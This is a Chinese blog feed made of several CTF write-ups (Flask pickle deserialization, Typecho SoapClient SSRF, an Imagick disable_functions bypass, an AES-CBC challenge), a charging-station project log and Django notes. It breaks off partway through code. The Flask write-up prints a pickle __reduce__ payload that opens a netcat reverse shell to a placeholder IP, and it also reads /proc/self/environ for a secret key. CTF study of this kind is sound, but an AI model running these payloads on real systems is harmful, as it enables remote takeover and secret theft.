        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[pickle|<code>__reduce__</code>]</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;file?file&#x3D;index.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF-2021-Final-easyflask/image-20211011144759876.png"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;file?file&#x3D;&#x2F;app&#x2F;source<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3.6</span><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> sessionapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"*******"</span>User <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span> <span class="token operator">=</span> u    <span class="token keyword">return</span> <span class="token string">"/file?file=index.js"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/file'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">file_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">or</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span> \            <span class="token keyword">or</span> <span class="token string">'.py'</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">'.sh'</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">'..'</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'disallowed'</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        content <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> content<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        u <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            u <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>u<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'uhh?'</span>    <span class="token keyword">if</span> u<span class="token punctuation">.</span>is_admin <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'welcome, admin'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'who are you?'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>session解码下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF-2021-Final-easyflask/image-20211012133613374.png"></p><p>2021年10月14日12:23:25</p><p>见鬼了，这个解码结果是错的，弄的我后面打了半天没成功</p><p>正确的应该是这个格式</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF-2021-Final-easyflask/image-20211014122351614.png"></p><p>读取环境变量<code>/proc/self/environ</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF-2021-Final-easyflask/image-20211012135834101.png" alt="、"></p><pre class="line-numbers language-none"><code class="language-none">glzjin22948575858jfjfjufirijidjitg3uiiuuh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里要用到pickle的<code>__reduce__</code>魔术方法，可见<a href="https://syunaht.com/p/3521738078.html#toc-heading-2">刷题笔记:[watevrCTF-2019]Pickle Store</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encodeUser <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('nc IP PORT -e /bin/sh')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> os        cmd <span class="token operator">=</span> <span class="token string">"cat /flag > /tmp/test1"</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以这么构造</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> os        cmd <span class="token operator">=</span> <span class="token string">"cat /flag > /tmp/test1"</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看样子不用拘泥于原来的class形式</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/weixin_43610673/article/details/118065324">https://blog.csdn.net/weixin_43610673/article/details/118065324</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校内充电桩 - 项目开发日志</title>
      <link href="/p/4095777995.html"/>
      <url>/p/4095777995.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开发三四天了，今天才想着写个开发日志，主要是感觉开发效率越来越低下了，明明一天除了吃饭睡觉都坐在电脑前，但一天都写不出几行代码，挺烦的。原本昨晚就想好要写了，得，今天又蹉跎了一天，现在才想起来写。</p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h3 id="2021年10月2日"><a href="#2021年10月2日" class="headerlink" title="2021年10月2日"></a>2021年10月2日</h3><p>前端开库。</p><p>写了一天基本功能写好，暂时采用云函数。</p><h3 id="2021年10月3日"><a href="#2021年10月3日" class="headerlink" title="2021年10月3日"></a>2021年10月3日</h3><p>后端开库，再三考虑决定用Django。反正也是小项目，效率至上。</p><h3 id="2021年10月4日"><a href="#2021年10月4日" class="headerlink" title="2021年10月4日"></a>2021年10月4日</h3><p>后端基本完工，数据库用的sqlite。</p><h3 id="2021年10月5日"><a href="#2021年10月5日" class="headerlink" title="2021年10月5日"></a>2021年10月5日</h3><p>尝试部署到服务器上，没想到django部署还挺麻烦，还得配置nginx。</p><h4 id="19-01-46"><a href="#19-01-46" class="headerlink" title="19:01:46"></a>19:01:46</h4><p>定时任务测试失败，读不到数据库的数据，怀疑是sqlite的原因。别把，sqlite的触发器没有if功能，我扔了，废了很大劲多写了好多代码，现在你让我换mysql？？？</p><h4 id="19-04-57"><a href="#19-04-57" class="headerlink" title="19:04:57"></a>19:04:57</h4><p>啊，还以为sqlite不支持多进程读取，我寻思总不可能这么残废吧。果然不是。但问题还是没找到。</p><h4 id="19-12-24"><a href="#19-12-24" class="headerlink" title="19:12:24"></a>19:12:24</h4><p>还好还好，只是sql路径问题。找不到文件应该写个报错的。</p><h4 id="19-30-25"><a href="#19-30-25" class="headerlink" title="19:30:25"></a>19:30:25</h4><p>我是啥b，原来表名写错了</p><h4 id="23-09-37"><a href="#23-09-37" class="headerlink" title="23:09:37"></a>23:09:37</h4><p>洗了半小时澡，吃了半小时西瓜，摸了一个小时鱼，最后花了十分钟部署完哩！启动成哩！</p><p>准备重写前端api，有点热，开个空调，先拿点葡萄吃吧。</p><h4 id="23-27-37"><a href="#23-27-37" class="headerlink" title="23:27:37"></a>23:27:37</h4><p>整了杯热牛奶，舒服，据说热牛奶有助睡眠，今天要早点睡！</p><p>这玻璃杯买来好几年了，淘宝店上说可以放微波炉，一直没敢放。刚刚鼓起勇气去放了下，在角落躲了三分钟，还好没爆。</p><h3 id="2021年10月6日"><a href="#2021年10月6日" class="headerlink" title="2021年10月6日"></a>2021年10月6日</h3><h4 id="00-47-50"><a href="#00-47-50" class="headerlink" title="00:47:50"></a>00:47:50</h4><p>api接入完毕，info界面明天再写8，该睡了。</p><h4 id="14-55-48"><a href="#14-55-48" class="headerlink" title="14:55:48"></a>14:55:48</h4><p>完善了下页面前端跳转(其实就写了个一个按钮)</p><p>接下来写子界面了。</p><h4 id="19-00-26"><a href="#19-00-26" class="headerlink" title="19:00:26"></a>19:00:26</h4><p>要死了，着实不会写前端，丑的自己都看不下去了。</p><h4 id="20-06-10"><a href="#20-06-10" class="headerlink" title="20:06:10"></a>20:06:10</h4><p>改了改，就这样吧。接下来还有</p><p>1.通知功能，暂不知道怎么写，貌似还得对接vx的api，感觉很麻烦</p><p>2.公告，这个好写，服务器放个txt完事</p><p>3.下拉刷新，马上完成！</p><p>4.意见反馈</p><h4 id="20-31-54"><a href="#20-31-54" class="headerlink" title="20:31:54"></a>20:31:54</h4><p>下拉刷新完毕！然后写什么好呢。</p><p>意见反馈有微信现成的，加个按钮完事，舒服！</p><h4 id="23-02-50"><a href="#23-02-50" class="headerlink" title="23:02:50"></a>23:02:50</h4><p>打了会游戏，有点累，想睡觉了。这个微信订阅消息有点麻烦啊。</p><h4 id="23-45-46"><a href="#23-45-46" class="headerlink" title="23:45:46"></a>23:45:46</h4><p>好耶，微信通知会整了！明天加到后端去。</p><p><img src="/../images/%E5%85%85%E7%94%B5%E6%A1%A9-%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/image-20211006234621872.png"></p><h3 id="10月7日"><a href="#10月7日" class="headerlink" title="10月7日"></a>10月7日</h3><h4 id="15-08-48"><a href="#15-08-48" class="headerlink" title="15:08:48"></a>15:08:48</h4><p>优化了下检测逻辑和项目目录，推到github上方便代码管理。</p><p>奇了怪了服务器上运行，log输出了三回，本地测试又没问题，见了鬼了。</p><p><img src="/../images/%E5%85%85%E7%94%B5%E6%A1%A9-%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/image-20211007151015367.png"></p><p>之后测试，本地又突然跑两次重复log，又试了一下又没了，绷不住了。</p><h4 id="17-22-02"><a href="#17-22-02" class="headerlink" title="17:22:02"></a>17:22:02</h4><p>完善了下前端显示逻辑，该收拾东西去学校了。</p><p>得，一天过去了，我的通知API还是没写！！</p><h3 id="10月8日"><a href="#10月8日" class="headerlink" title="10月8日"></a>10月8日</h3><h4 id="00-15-16"><a href="#00-15-16" class="headerlink" title="00:15:16"></a>00:15:16</h4><p>到学校了，摸鱼了好久，初步写了下通知api。明天再测试吧。推送上去碎觉了。</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信小程序 </tag>
            
            <tag> Django </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django学习笔记</title>
      <link href="/p/418459895.html"/>
      <url>/p/418459895.html</url>
      
        <content type="html"><![CDATA[<h2 id="Models"><a href="#Models" class="headerlink" title="Models"></a>Models</h2><p>新增/更改Models表后需要生成建库脚本</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">#生成脚本python manage.py makemigrations index#写入库python manage.py migrate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="管理员"><a href="#管理员" class="headerlink" title="管理员"></a>管理员</h2><pre class="line-numbers language-none"><code class="language-none">python manage.py createsuperuser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="将models纳入管理范围"><a href="#将models纳入管理范围" class="headerlink" title="将models纳入管理范围"></a>将models纳入管理范围</h3><p>在admin.py或models.py中写入：</p><pre class="line-numbers language-none"><code class="language-none">from .models import Dataadmin.site.register(Data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211004174009236.png"></p><p>这数据库名，我明明没加s，他自动给加了个s。怪</p><p><img src="/../images/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211004174224004.png"></p><p><img src="/../images/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211004174257947.png"></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[MRCTF2020]Ezpop_Revenge</title>
      <link href="/p/4087374903.html"/>
      <url>/p/4087374903.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化|typecho|soap]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezpop-Revenge/image-20210927230014040.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>扫目录扫出<a href="http://www.zip/">www.zip</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezpop-Revenge/image-20210927230136422.png"></p><p>第一步是找输入点，在usr/plugins/HelloWorld/Plugin.php中找到个action()</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezpop-Revenge/image-20210930000129387.png"></p><blockquote><p>这里的action一般是自动加载的，当路由加载类时会自动加载某个函数。</p></blockquote><p>比如路径是这样的，所有搜HelloWorld_Plugin(类似于字符串拼接而成的包名，由路由代码决定)</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezpop-Revenge/image-20210930000253789.png"></p><p>在var/Typecho/Plugin.php中找到</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezpop-Revenge/image-20210930000359877.png"></p><p>访问<code>/page_admin</code>的时候，会自动加载<code>HelloWorld_Plugin</code>类，而且会自动调用<code>action</code>函数，所以我们输入点的路由为<code>/page_admin</code></p><p>在usr/plugins/HelloWorld/Plugin.php中还有</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezpop-Revenge/image-20210930000736200.png"></p><h3 id="SoapClient-SSRF"><a href="#SoapClient-SSRF" class="headerlink" title="SoapClient SSRF"></a>SoapClient SSRF</h3><p>详细见<a href="https://syunaht.com/p/3063917200.html#toc-heading-6">刷题笔记:bestphp’s revenge</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:Wallbreaker_Easy</title>
      <link href="/p/1536130113.html"/>
      <url>/p/1536130113.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[disable_function|Imagick]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Wallbreaker-Easy/image-20210927221905026.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>提示可以说是十分明显了，利用imagick去disable_function bypass</p><p>见<a href="https://syunaht.com/p/3790227649.html">disable_functions bypass</a></p><p>用imagick函数，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Wallbreaker-Easy/image-20210927223518485.png"></p><p>在open_basedir处上传文件</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Wallbreaker-Easy/image-20210927223537125.png"></p><p>然后</p><pre class="line-numbers language-none"><code class="language-none">?cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;d0d3c007f47b85e47c312ef8e20c88e6&#x2F;xx&amp;sopath&#x3D;&#x2F;tmp&#x2F;d0d3c007f47b85e47c312ef8e20c88e6&#x2F;bypass_disablefunc_x64.soPOST:backdoor&#x3D;include(&#39;&#x2F;tmp&#x2F;d0d3c007f47b85e47c312ef8e20c88e6&#x2F;1.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Wallbreaker-Easy/image-20210927223629902.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Wallbreaker-Easy/image-20210927223639920.png"></p><p>站在巨人的肩膀上就是轻松鸭。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> disable_function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[NPUCTF2020]web狗</title>
      <link href="/p/2598013568.html"/>
      <url>/p/2598013568.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">我摊牌了，就是懒得写前端<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment"># $key,$flag</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"METHOD"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"aes-128-cbc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//定义加密方式</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SECRET_KEY"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//定义密钥</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"IV"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"6666666666666666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//定义初始向量 16个6</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"BR"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location:./index.php?source=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#var_dump($GLOBALS);   //听说你想看这个？</span><span class="token keyword">function</span> <span class="token function-definition function">aes_encrypt</span><span class="token punctuation">(</span><span class="token variable">$iv</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"--------encrypt---------"</span><span class="token operator">.</span><span class="token constant">BR</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'IV:'</span><span class="token operator">.</span><span class="token variable">$iv</span><span class="token operator">.</span><span class="token constant">BR</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">BR</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">aes_decrypt</span><span class="token punctuation">(</span><span class="token variable">$iv</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">METHOD</span><span class="token punctuation">,</span><span class="token constant">SECRET_KEY</span><span class="token punctuation">,</span><span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span><span class="token variable">$iv</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'False'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token constant">IV</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">aes_encrypt</span><span class="token punctuation">(</span><span class="token variable">$iv</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"decrypt"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">aes_decrypt</span><span class="token punctuation">(</span><span class="token variable">$iv</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 